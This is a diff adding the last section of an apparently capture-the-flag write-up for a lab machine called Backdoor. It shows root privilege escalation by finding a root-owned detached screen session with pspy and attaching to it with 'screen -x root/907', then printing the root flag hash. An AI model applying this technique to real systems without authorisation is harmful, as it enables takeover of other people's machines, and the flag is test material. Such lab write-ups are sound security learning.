@@ -273,14 +273,79 @@ user@Backdoor:/home/user$
 If you remember there's a screen process running
 
 ```
+/bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
 ```
 
-Checking the version of screen present
+I'll upload pspy to know who its running as
 
 ```
-user@Backdoor:/home/user$ screen -version
-Screen version 4.08.00 (GNU) 05-Feb-20
+2023/02/24 20:15:26 CMD: UID=0    PID=1821   | sleep 1 
+2023/02/24 20:15:27 CMD: UID=???  PID=1824   | ???
+2023/02/24 20:15:27 CMD: UID=0    PID=1825   | sleep 1 
+2023/02/24 20:15:28 CMD: UID=???  PID=1826   | ???
+2023/02/24 20:15:28 CMD: UID=0    PID=1827   | sleep 1 
+2023/02/24 20:15:29 CMD: UID=0    PID=1829   | sleep 1 
+2023/02/24 20:15:30 CMD: UID=0    PID=1830   | 
+2023/02/24 20:15:30 CMD: UID=0    PID=1831   | sleep 1 
+2023/02/24 20:15:31 CMD: UID=0    PID=1832   | 
+2023/02/24 20:15:31 CMD: UID=0    PID=1833   | sleep 1 
+2023/02/24 20:15:32 CMD: UID=0    PID=1836   | 
+2023/02/24 20:15:32 CMD: UID=0    PID=1837   | sleep 1 
+2023/02/24 20:15:33 CMD: UID=0    PID=1838   | find /var/run/screen/S-root/ -empty -exec screen -dmS root ;                                         
+```
+
+Cool its running as root 
+
+Running screen -ls will show sessions for the current user:
+
+```
+user@Backdoor:/home/user$ screen -ls
+No Sockets found in /run/screen/S-user.
+```
+
+Since the process is running as root i'll check the sessions in root/ 
+
+```
+user@Backdoor:/home/user$ screen -ls root/
+There is a suitable screen on:
+        907.root        (02/24/23 20:11:07)     (Multi, detached)
+1 Socket in /run/screen/S-root.
 user@Backdoor:/home/user$ 
 ```
+
+Now i'll attach to the root session
+
+```
+screen -x root/907
+```
+
+Doing that gives shell as root
+
+```
+root@Backdoor:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@Backdoor:~# ls -al
+total 44
+drwx------  7 root root 4096 Nov 10  2021 .
+drwxr-xr-x 19 root root 4096 Nov 15  2021 ..
+lrwxrwxrwx  1 root root    9 Jul 18  2021 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
+drwx------  2 root root 4096 Nov 10  2021 .cache
+drwx------  3 root root 4096 Nov 10  2021 .config
+drwxr-xr-x  3 root root 4096 Nov 10  2021 .local
+lrwxrwxrwx  1 root root    9 Nov  6  2021 .mysql_history -> /dev/null
+-rw-r--r--  1 root root  161 Dec  5  2019 .profile
+drwxr-xr-x  2 root root 4096 Nov 10  2021 .reset
+-rw-r--r--  1 root root   33 Feb 24 20:11 root.txt
+-rw-r--r--  1 root root   42 Feb 24 20:11 .screenrc
+drwx------  2 root root 4096 Nov 10  2021 .ssh
+root@Backdoor:~# cat root.txt 
+a54e9fe799a68c3a8555940f22cd3fd7
+root@Backdoor:~# 
+```
+
+And we're done
+<br> <br>
+[Back To Home](../../index.md)
 
 
